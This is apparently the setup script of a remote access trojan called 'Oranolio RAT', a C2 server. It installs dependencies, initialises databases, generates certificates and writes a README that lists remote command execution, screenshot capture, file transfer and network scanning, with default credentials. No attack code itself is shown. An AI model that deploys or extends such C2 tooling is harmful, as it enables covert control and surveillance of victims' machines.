#!/usr/bin/env python3
"""
Oranolio RAT - Elite C2 Framework Setup Script
Automatically sets up the entire system for production use
"""

import os
import sys
import subprocess
import logging
from pathlib import Path
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class SystemSetup:
    """Handles complete system setup"""
    
    def __init__(self):
        self.base_dir = Path(__file__).parent
        self.setup_log = []
        
    def log_step(self, step: str, success: bool = True, message: str = ""):
        """Log a setup step"""
        status = "✓" if success else "✗"
        log_entry = f"{status} {step}"
        if message:
            log_entry += f" - {message}"
        
        self.setup_log.append(log_entry)
        logger.info(log_entry)
        
        if not success:
            logger.error(f"Setup failed at step: {step}")
            return False
        return True
    
    def check_python_version(self):
        """Check Python version compatibility"""
        version = sys.version_info
        if version.major < 3 or (version.major == 3 and version.minor < 8):
            self.log_step("Python version check", False, f"Python 3.8+ required, found {version.major}.{version.minor}")
            return False
        
        self.log_step("Python version check", True, f"Python {version.major}.{version.minor}.{version.micro}")
        return True
    
    def install_dependencies(self):
        """Install Python dependencies"""
        try:
            # Install main requirements
            result = subprocess.run([
                sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'
            ], capture_output=True, text=True, cwd=self.base_dir)
            
            if result.returncode != 0:
                self.log_step("Install dependencies", False, result.stderr)
                return False
            
            # Install development requirements if requested
            if os.getenv('INSTALL_DEV_DEPS', 'false').lower() in ('true', '1', 'yes'):
                result = subprocess.run([
                    sys.executable, '-m', 'pip', 'install', '-r', 'requirements-dev.txt'
                ], capture_output=True, text=True, cwd=self.base_dir)
                
                if result.returncode != 0:
                    self.log_step("Install dev dependencies", False, result.stderr)
                    return False
                
                self.log_step("Install dev dependencies", True)
            
            self.log_step("Install dependencies", True)
            return True
            
        except Exception as e:
            self.log_step("Install dependencies", False, str(e))
            return False
    
    def create_directories(self):
        """Create necessary directories"""
        directories = [
            'data',
            'logs',
            'uploads',
            'downloads',
            'exports',
            'backups',
            'certs',
            'temp'
        ]
        
        for directory in directories:
            try:
                dir_path = self.base_dir / directory
                dir_path.mkdir(exist_ok=True)
                self.log_step(f"Create directory: {directory}", True)
            except Exception as e:
                self.log_step(f"Create directory: {directory}", False, str(e))
                return False
        
        return True
    
    def setup_environment(self):
        """Setup environment configuration"""
        try:
            # Check if .env exists
            env_file = self.base_dir / '.env'
            env_example = self.base_dir / '.env.example'
            
            if not env_file.exists():
                if env_example.exists():
                    # Copy example to .env
                    import shutil
                    shutil.copy(env_example, env_file)
                    self.log_step("Create .env file", True, "Copied from .env.example")
                else:
                    # Create basic .env
                    with open(env_file, 'w') as f:
                        f.write("# Oranolio RAT Configuration\n")
                        f.write("SECRET_KEY=change-this-in-production\n")
                        f.write("JWT_SECRET=change-this-in-production\n")
                        f.write("DEBUG=false\n")
                        f.write("FROM_EMAIL=admin@oranolio.local\n")
                        f.write("FROM_NAME=Oranolio Security\n")
                    
                    self.log_step("Create .env file", True, "Created with defaults")
            else:
                self.log_step("Create .env file", True, "Already exists")
            
            return True
            
        except Exception as e:
            self.log_step("Setup environment", False, str(e))
            return False
    
    def initialize_databases(self):
        """Initialize all databases"""
        try:
            from initialize_databases import DatabaseInitializer
            
            initializer = DatabaseInitializer()
            if not initializer.initialize_all_databases():
                self.log_step("Initialize databases", False, "Database initialization failed")
                return False
            
            if not initializer.verify_databases():
                self.log_step("Verify databases", False, "Database verification failed")
                return False
            
            self.log_step("Initialize databases", True)
            return True
            
        except Exception as e:
            self.log_step("Initialize databases", False, str(e))
            return False
    
    def generate_ssl_certificates(self):
        """Generate SSL certificates"""
        try:
            from ssl_utils import CertificateManager
            
            cert_manager = CertificateManager()
            success, message = cert_manager.generate_self_signed_certificate()
            
            if not success:
                self.log_step("Generate SSL certificates", False, message)
                return False
            
            self.log_step("Generate SSL certificates", True, message)
            return True
            
        except Exception as e:
            self.log_step("Generate SSL certificates", False, str(e))
            return False
    
    def test_imports(self):
        """Test that all modules can be imported"""
        modules_to_test = [
            'web_app',
            'auth_utils',
            'web_app_enhancements',
            'native_protocol_bridge',
            'ssl_utils',
            'validation_schemas',
            'error_handler',
            'initialize_databases',
            'auth_routes',
            'api_routes',
            'dashboard_routes',
            'websocket_handlers',
            'command_handlers',
            'webhook_auth_routes',
            'oranolio_auth_routes'
        ]
        
        failed_imports = []
        
        for module in modules_to_test:
            try:
                __import__(module)
                self.log_step(f"Import {module}", True)
            except Exception as e:
                failed_imports.append(module)
                self.log_step(f"Import {module}", False, str(e))
        
        if failed_imports:
            self.log_step("Test imports", False, f"Failed imports: {', '.join(failed_imports)}")
            return False
        
        self.log_step("Test imports", True)
        return True
    
    def create_startup_script(self):
        """Create startup script"""
        try:
            startup_script = self.base_dir / 'start_oranolio.py'
            
            with open(startup_script, 'w') as f:
                f.write('''#!/usr/bin/env python3
"""
Oranolio RAT - Elite C2 Framework Startup Script
"""

import sys
import os

# Add current directory to Python path
sys.path.insert(0, os.path.dirname(__file__))

if __name__ == "__main__":
    from main_entry import main
    main()
''')
            
            # Make executable
            os.chmod(startup_script, 0o755)
            
            self.log_step("Create startup script", True)
            return True
            
        except Exception as e:
            self.log_step("Create startup script", False, str(e))
            return False
    
    def run_system_tests(self):
        """Run basic system tests"""
        try:
            # Test database connection
            from initialize_databases import DatabaseInitializer
            initializer = DatabaseInitializer()
            if not initializer.verify_databases():
                self.log_step("Test database connection", False, "Database verification failed")
                return False
            
            self.log_step("Test database connection", True)
            
            # Test authentication system
            from auth_utils import auth_manager
            test_user = auth_manager.get_user_by_id(1)  # Check if default admin exists
            if not test_user:
                self.log_step("Test authentication system", False, "No admin user found")
                return False
            
            self.log_step("Test authentication system", True)
            
            # Test configuration
            from config import Config
            if not Config.SECRET_KEY:
                self.log_step("Test configuration", False, "No secret key configured")
                return False
            
            self.log_step("Test configuration", True)
            
            return True
            
        except Exception as e:
            self.log_step("Run system tests", False, str(e))
            return False
    
    def create_documentation(self):
        """Create basic documentation"""
        try:
            readme_content = f"""# Oranolio RAT - Elite C2 Framework

## Quick Start

1. **Setup Complete**: The system has been automatically configured
2. **Start the system**: `python start_oranolio.py`
3. **Access the web interface**: http://localhost:5000
4. **Default credentials**: 
   - Email: admin@oranolio.local
   - Password: admin123

## Important Security Notes

⚠️ **CHANGE DEFAULT CREDENTIALS IMMEDIATELY**
- Update the admin password in the web interface
- Change the default email addresses in .env file
- Generate new secret keys for production

## Configuration

Edit the `.env` file to customize settings:
- Database paths
- Email configuration
- SSL certificates
- Security settings

## Features

- ✅ Web-based Command & Control
- ✅ Real-time monitoring via WebSockets
- ✅ Multi-Factor Authentication
- ✅ API key management
- ✅ Webhook authentication
- ✅ Elite command execution
- ✅ File upload/download
- ✅ Screenshot capture
- ✅ Process management
- ✅ Network scanning
- ✅ SSL/TLS encryption
- ✅ Input validation
- ✅ Error handling
- ✅ Rate limiting
- ✅ Session management

## Setup Log

{chr(10).join(self.setup_log)}

## Support

For issues and questions, check the logs in the `logs/` directory.
"""
            
            with open(self.base_dir / 'SETUP_COMPLETE.md', 'w') as f:
                f.write(readme_content)
            
            self.log_step("Create documentation", True)
            return True
            
        except Exception as e:
            self.log_step("Create documentation", False, str(e))
            return False
    
    def run_complete_setup(self):
        """Run the complete setup process"""
        logger.info("Starting Oranolio RAT - Elite C2 Framework Setup")
        logger.info("=" * 60)
        
        setup_steps = [
            ("Check Python version", self.check_python_version),
            ("Create directories", self.create_directories),
            ("Setup environment", self.setup_environment),
            ("Install dependencies", self.install_dependencies),
            ("Initialize databases", self.initialize_databases),
            ("Generate SSL certificates", self.generate_ssl_certificates),
            ("Test imports", self.test_imports),
            ("Create startup script", self.create_startup_script),
            ("Run system tests", self.run_system_tests),
            ("Create documentation", self.create_documentation)
        ]
        
        failed_steps = []
        
        for step_name, step_func in setup_steps:
            logger.info(f"Running: {step_name}")
            if not step_func():
                failed_steps.append(step_name)
                logger.error(f"Setup failed at: {step_name}")
                break
        
        # Print summary
        logger.info("=" * 60)
        logger.info("SETUP SUMMARY")
        logger.info("=" * 60)
        
        if failed_steps:
            logger.error(f"❌ Setup FAILED at: {', '.join(failed_steps)}")
            logger.error("Please fix the errors and run setup again")
            return False
        else:
            logger.info("✅ Setup COMPLETED successfully!")
            logger.info("")
            logger.info("Next steps:")
            logger.info("1. Review and update .env file")
            logger.info("2. Change default credentials")
            logger.info("3. Start the system: python start_oranolio.py")
            logger.info("4. Access web interface: http://localhost:5000")
            logger.info("")
            logger.info("Default credentials:")
            logger.info("  Email: admin@oranolio.local")
            logger.info("  Password: admin123")
            logger.info("")
            logger.info("⚠️  WARNING: Change default credentials immediately!")
            
            return True

def main():
    """Main setup function"""
    setup = SystemSetup()
    success = setup.run_complete_setup()
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()